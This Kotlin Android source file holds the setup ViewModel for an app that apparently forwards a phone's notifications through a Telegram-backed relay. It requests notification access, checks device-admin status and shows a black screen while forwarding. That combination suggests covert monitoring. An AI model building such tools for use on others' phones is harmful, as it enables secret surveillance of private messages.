package com.imista.forward.sender.viewmodel

import android.app.Application
import android.content.Context
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.imista.forward.sender.security.SecureStorage
import com.imista.forward.shared.network.RelayRepository
import com.imista.forward.shared.validation.PairingValidator
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.util.UUID

data class SetupState(
    val step: Int = 1,
    val notificationEnabled: Boolean = false,
    val deviceAdminEnabled: Boolean = false,
    val pairingId: String = "",
    val relayUrl: String = "",
    val verificationStatus: String? = null,
    val isVerifying: Boolean = false,
    val canStartForwarding: Boolean = false,
    val showBlackScreen: Boolean = false
)

class SetupViewModel(app: Application) : AndroidViewModel(app) {
    private val secure = SecureStorage(app)
    private val ctx = getApplication<Application>()

    private val _state = MutableStateFlow(SetupState(
        pairingId = secure.pairingId ?: UUID.randomUUID().toString(),
        relayUrl = secure.relayUrl,
        showBlackScreen = secure.onboardingComplete && secure.forwardingActive
    ))
    val state: StateFlow<SetupState> = _state

    init { refresh() }

    fun refresh() {
        val notifEnabled = isNotificationEnabled()
        val adminEnabled = isDeviceAdminEnabled()
        val pairingId = secure.pairingId ?: _state.value.pairingId
        val canStart = notifEnabled && secure.isPairingConfigured()
        _state.value = _state.value.copy(
            notificationEnabled = notifEnabled,
            deviceAdminEnabled = adminEnabled,
            pairingId = pairingId,
            canStartForwarding = canStart,
            showBlackScreen = secure.onboardingComplete && secure.forwardingActive
        )
    }

    fun generateNewPairing() {
        val newId = UUID.randomUUID().toString()
        secure.pairingId = newId
        _state.value = _state.value.copy(pairingId = newId, verificationStatus = null, canStartForwarding = false)
        // Register with relay immediately
        registerPairing()
    }

    fun registerPairing() {
        viewModelScope.launch {
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Registering with secure relay...")
            val pairingId = _state.value.pairingId
            if (pairingId.isBlank()) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Pairing ID empty")
                return@launch
            }
            secure.pairingId = pairingId
            val relay = RelayRepository(secure.relayUrl)
            val res = relay.register(pairingId, secure.deviceId, secure.deviceName, "SENDER")
            if (res.isSuccess) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "✅ Paired with relay. Share this ID with Receiver: $pairingId", canStartForwarding = _state.value.notificationEnabled)
            } else {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Relay register failed: ${res.exceptionOrNull()?.message}. Check relay URL & internet.")
            }
        }
    }

    fun verifyConnection() {
        viewModelScope.launch {
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Verifying...")
            val pairingId = secure.pairingId ?: _state.value.pairingId
            if (pairingId.isBlank()) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Pairing ID not set")
                return@launch
            }
            val relay = RelayRepository(secure.relayUrl)
            // Check health first
            val health = relay.health()
            if (health.isFailure) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Relay unreachable: ${health.exceptionOrNull()?.message}. Verify relay deployed with TELEGRAM_BOT_KEY.")
                return@launch
            }
            val pairingCheck = relay.getPairing(pairingId)
            if (pairingCheck.isSuccess) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "✅ Secure relay connected. Pairing verified.", canStartForwarding = _state.value.notificationEnabled)
            } else {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Verification failed: ${pairingCheck.exceptionOrNull()?.message}. Ensure pairing registered & relay has TELEGRAM_BOT_KEY.")
            }
        }
    }

    fun startForwarding() {
        // Must have notification access
        if (!isNotificationEnabled()) {
            _state.value = _state.value.copy(verificationStatus = "Enable Notification Access first")
            return
        }
        if (secure.pairingId.isNullOrBlank()) secure.pairingId = _state.value.pairingId
        secure.onboardingComplete = true
        secure.forwardingActive = true
        _state.value = _state.value.copy(showBlackScreen = true, verificationStatus = "Forwarding active")
    }

    fun stopForwarding() {
        secure.forwardingActive = false
        secure.onboardingComplete = false
        _state.value = _state.value.copy(showBlackScreen = false)
    }

    fun updatePairingId(newId: String) {
        // Validate UUID
        if (newId.isNotBlank() && !PairingValidator.isValidPairingId(newId.trim())) {
            _state.value = _state.value.copy(verificationStatus = "Invalid pairing ID format (must be UUID)")
            return
        }
        secure.pairingId = newId.trim()
        _state.value = _state.value.copy(pairingId = newId.trim(), verificationStatus = null)
    }

    private fun isNotificationEnabled(): Boolean {
        val flat = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return flat?.contains(ctx.packageName) == true
    }

    private fun isDeviceAdminEnabled(): Boolean {
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val comp = android.content.ComponentName(ctx, com.imista.forward.sender.receiver.ImistaDeviceAdminReceiver::class.java)
            dpm.isAdminActive(comp)
        } catch (e: Exception) { false }
    }
}
